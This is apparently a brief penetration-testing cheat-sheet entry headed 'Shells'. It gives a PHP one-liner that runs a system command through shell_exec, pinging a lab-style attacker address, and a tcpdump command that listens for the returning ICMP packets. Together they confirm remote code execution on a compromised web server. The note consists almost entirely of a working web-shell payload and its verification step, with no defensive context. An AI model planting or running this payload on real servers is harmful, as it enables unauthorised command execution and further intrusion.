# Shells

PHP
---------------------------------------------------
```
<?php echo shell_exec("ping -c 1 10.10.10.10");?>
```
listen for ICMP traces on the tun0 interface
```
sudo tcpdump -n -i tun0 icmp
```
---------------------------------------------------
